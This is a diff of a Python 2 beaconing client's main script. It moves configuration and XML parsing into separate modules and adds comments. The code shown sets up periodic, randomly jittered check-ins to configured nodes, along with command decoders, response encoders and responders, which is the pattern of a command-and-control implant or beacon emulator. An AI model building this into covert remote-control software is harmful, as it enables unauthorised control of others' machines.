@@ -1,10 +1,11 @@
 #!/usr/bin/env python
 
+import config
 from controller import Controller, NODE_IP_KEY, NODE_PORT_KEY
 import time
 from random import randint
 import sys
-import xml.etree.ElementTree as ET
+from parser import *
 
 #
 # Overall configurations should include:
@@ -23,80 +24,25 @@ import xml.etree.ElementTree as ET
 # - http://stackoverflow.com/questions/13629321/handling-dynamic-import-with-py2exe
 # - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/
 
-PROMPT = "[]>"
-DEFAULT_CONFIG_FILE = "settings.xml"
-NODES_TAG = 'nodes'
-NODE_TAG = 'node'
-N_TYPE_T = 'type'
-N_PORT_T = 'port'
-N_HOST_T = 'host'
-PARAMS_TAG = 'parameters'
-PARAM_TAG = 'parameter'
-P_NAME_T = 'name'
-
-MIN_SLEEP_INT = 60
-MAX_SLEEP_INT = 600
-ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
-ACTIVE_HOURS = ('0001','2359')
-
-# global flag
-continue_beacon = True
-
-def get_xml():
-    
-    config_filename = DEFAULT_CONFIG_FILE
-    
-    if len(sys.argv) > 1:
-        config_filename = sys.argv[1]
-    
-    try:
-        xmltree = ET.parse(config_filename)
-        xmlroot = xmltree.getroot()
-    except IOError, io:
-        print '%s ERROR: Issue getting file \'%s\'. Make sure it exists at the appropriate path.' % (PROMPT, config_filename)
-        exit()
-    except Exception, e:
-        raise e
-        
-    return xmlroot
-    
-def parse_nodes(xml):
-    
-    nodes_list = []
-    for n in xml.findall(NODE_TAG):
-        
-        try:
-            n_type = n.attrib[N_TYPE_T]
-        
-            n_dict = {}
-            n_dict[NODE_PORT_KEY] = n.find(N_PORT_T).text
-            n_dict[NODE_IP_KEY] = n.find(N_HOST_T).text
-            
-        except:
-            print '%s Nodes must provide a type, host/ip and port at minimum' % (PROMPT)
-            raise
-        
-        for param in n.find(PARAMS_TAG).findall(PARAM_TAG):
-            n_dict[param.get(P_NAME_T)] = param.text
-        
-        nodes_list.append((n_type,n_dict))
-        
-    return nodes_list
-
 def load_config():
-    #
-    # this is where the configuration file is parsed.
-    #
+    """
+     this is where the configuration XML file is parsed.
+    """
+    
     try:
-        config_xml = get_xml()
+        # if the config file is provided as the first command line argument, use that. Else find the default value from the config.py file.
+        if len(sys.argv) > 1:
+            config_filename = sys.argv[1]
+        else:
+            config_filename = config.DEFAULT_CONFIG_FILE
+        config_xml = get_xml(config_filename)
         
-        parsed_nodes = parse_nodes(config_xml.find(NODES_TAG))
-        if len(parsed_nodes) > 0:
-            global NODES
-            NODES = parsed_nodes
-        
+        # run the parsers. Nothing returns, they just set the values in config.py.
+        parse_nodes(config_xml.find(config.NODES_TAG))
+        parse_behaviors(config_xml.find( config.BEHAV_TAG))
+
     except Exception, e:
-        print '%s Fatal error parsing XML element - %s' % (PROMPT, e)
+        print '%s Fatal error parsing XML element - %s' % ( config.PROMPT, e)
         exit()
 
     beacons = ['http_get']
@@ -105,31 +51,45 @@ def load_config():
     encoders = []
     responders = []
     
+    # if no encoders were parsed, just invert the decoders. Effectively says "use the same encoding for responses as was used for the commands
+    # received during the beaconing"
     if len(encoders) == 0:
             encoders = reversed(decoders)
-            
+    
+    # If no responders were parsed use the same nodes that we beacon out to.
     if len(responders) == 0:
             responders = beacons
     
     return (beacons,commands,decoders,encoders,responders)
     
 def calculate_sleep():
+    """
+    This is used by start_beacon_loop() to calculate how long to sleep.
+    This should include any checks related to the behavior of beaconing frequency.
+    """
 
     #cur_time = time.ctime()
     sleep_time = 0
 
-    sleep_time += randint(MIN_SLEEP_INT,MAX_SLEEP_INT)
+    # random time between the min and max sleep interval.
+    sleep_time += randint(config.MIN_SLEEP_INT,config.MAX_SLEEP_INT)
     
     return sleep_time
     
 
 def start_beacon_loop(controller):
+    """
+    this is the iterative loop that calls the controller to start beaconing.
+    This should implement behaviors related to the overall success and failure of a beaconing iteration.
+    """
     
-    while continue_beacon:
+    while config.CONTINUE_BEACON:
         
-        controller.beacon(NODES)
+        # Call the controller's beaconing facade, which in turns starts the beaconing iteration.
+        controller.beacon(config.NODES)
+        # based upon the results of the beaconing iteration, implement behaviors here to do if fail/success
         sleep_int = calculate_sleep()
-        print PROMPT + " Sleeping for %d seconds" % (sleep_int)
+        print  config.PROMPT + " Sleeping for %d seconds" % (sleep_int)
         time.sleep(sleep_int)
         
     return True
@@ -137,13 +97,13 @@ def start_beacon_loop(controller):
 
 def main():
     
-    print PROMPT + " Starting..."
+    print config.PROMPT + " Starting..."
     beacons, commands, decoders, encoders, responders = load_config()
     
-    print PROMPT + " Building controller..."
+    print config.PROMPT + " Building controller..."
     controller = Controller(beacons, commands, decoders, encoders, responders)
     
-    print PROMPT + " Starting beaconer loop..."
+    print config.PROMPT + " Starting beaconer loop..."
     start_beacon_loop(controller)
     
 
@@ -151,5 +111,5 @@ if __name__ == "__main__":
     try:
         main()
     except (KeyboardInterrupt, SystemExit):
-        print PROMPT + " Exiting"
+        print config.PROMPT + " Exiting"
         exit()
